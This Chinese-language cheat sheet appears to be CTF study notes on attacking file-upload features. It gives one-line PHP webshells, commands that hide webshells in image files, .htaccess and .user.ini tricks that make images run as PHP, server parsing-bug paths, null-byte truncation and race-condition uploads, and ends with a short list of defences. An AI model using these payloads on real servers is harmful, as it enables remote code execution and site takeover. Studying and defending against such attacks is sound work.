## 二、一句话木马 / WebShell

```php
<?php eval($_POST[1]);?>
<?php @eval($_POST['cmd']);?>
<?php assert($_POST[1]);?>          # assert 在 PHP7 后不再是函数
<?= $_POST[1];?>                     # PHP 短标签
```

**大马 vs 小马**：

* 小马（一句话木马）：代码小，靠菜刀/蚁剑连接
* 大马：代码大，功能丰富（文件管理、命令执行、数据库）\
  出处: `文件上传漏洞.md` L15-L24

**常用危险函数**: `eval()` `assert()` `preg_replace()`（`文件上传漏洞.md` L1942）

## 三、图片马制作

```bash
# 命令行拼接
copy /b normal.jpg + shell.php image.jpg          # Windows
cat normal.jpg shell.php > image.jpg              # Linux

# GIF 头
echo 'GIF89a<?php eval($_POST[1]);?>' > shell.gif

# 追加（绕过 getimagesize 内容检测）
echo '<?php eval($_POST[1]);?>' >> normal.png

# exiftool 写入 EXIF
exiftool -Comment='<?php eval($_POST[1]);?>' image.jpg
```

文件头十六进制（`文件上传漏洞.md` L242）：

| 类型 | 开头十六进制 |
| --- | --- |
| PNG | `89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52` |
| JPG | `FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 01 2C` |
| GIF | `47 49 46 38 39 61 F1 00 2C 01 F7 00 00 64 32 33` |

> 图片马上传后**不能直接执行**，需配合文件包含（L1022）或其他漏洞触发。

## 四、.htaccess 攻击（Apache）★

```plain
# 1. 把 .png 当 PHP 解析
AddType application/x-httpd-php .png

# 2. 文件名含 php 关键字即执行（muma.php.png）
AddHandler php5-script php

# 3. 匹配指定文件名
<FilesMatch "1997sty">
SetHandler application/x-httpd-php
</FilesMatch>

# 4. 全部当 PHP
SetHandler application/x-httpd-php
```

出处: `文件上传漏洞.md` L291-L331

***

## 五、.user.ini（PHP-FPM）★现代高频

```properties
auto_prepend_file=shell.png        # 所有 php 执行前自动包含 shell.png
auto_append_file=shell.png
```

条件: PHP 以 **FPM/FastCGI** 模式运行（Nginx 常用）。上传 `.user.ini` + 图片马即可 getshell。

***

## 六、Web 容器解析漏洞

### 6.1 Apache（从右向左识别后缀）

`x.php.xxx` → 从右往左找认识的后缀，`xxx` 不认识则继续 → `php` 命中\
出处: L375

### 6.2 IIS 6.0

```plain
x.asp;.jpg          # 分号截断
x.asp/x.jpg         # 目录名当后缀
```

出处: L381

### 6.3 PHP CGI（IIS 7.0/7.5）

```plain
/upload/info.png/.php         # 追加 /.php 骗过服务器
```

修复: `cgi.fix_pathinfo = 0`\
出处: L389

### 6.4 Nginx 解析

```plain
/uploadfiles/nginx.png/.php              # 解析漏洞
info.jpg%00.php                          # 空字节漏洞
CVE-2013-4547（文件名逻辑，空格 \x20 触发）  # vulhub 复现
```

出处: L406-L445

## 七、%00 截断（PHP < 5.3.4）

```plain
save_path=/upload/shell.php%00   +  后缀 .jpg 被截断
```

原理: C 语言字符串以 `\0` 结尾，PHP 继承此特性。\
出处: L263

***

## 八、条件竞争

```php
// 服务器逻辑: 上传 → rename 改名 → unlink 删除
// 攻击: 在 unlink 前访问 webshell
```

并发脚本：一边疯狂上传，一边疯狂访问上传路径，命中窗口期即 getshell。\
出处: `文件上传漏洞.md` L1459、`中国工业互联网江苏省选拔赛.meta.md`

## 十、现代补充（网络调研）

* **PHP 8 下老解析漏洞基本修复**，比赛更偏向：
  * `.user.ini` + PHP-FPM
  * 条件竞争（多线程 / 大量并发）
  * 文件名 SQL 注入（文件名入库时未过滤）
  * 云存储上传（OSS/S3）二次渲染绕过
  * 图片马 + 二次渲染的像素级保留

***

## 十一、防御要点

1. 白名单策略，严格限制后缀
2. 二次渲染，过滤图片马
3. 上传文件重命名，少用客户端信息
4. 避免文件包含漏洞
5. 严格处理路径，防 `00` 截断、空格、`.`、`::$DATA`
6. 及时更新 web 容器；可写目录不给执行权限\
   出处: `文件上传漏洞.md` L447
